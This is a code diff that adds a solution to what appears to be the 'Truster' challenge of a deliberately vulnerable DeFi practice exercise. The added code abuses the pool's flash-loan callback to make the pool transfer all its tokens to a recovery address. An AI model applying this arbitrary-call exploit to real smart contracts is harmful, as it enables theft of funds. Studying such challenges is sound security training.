@@ -51,7 +51,10 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // data to be passed
+        bytes memory data = abi.encodeWithSelector(token.transfer.selector, recovery, TOKENS_IN_POOL);
+        // data that will be passed as target.functionCall() for a low level call tah transfer all teh tokens from contract to recovery account
+        pool.flashloan(0,address(player),address(token),data);
     }
 
     /**
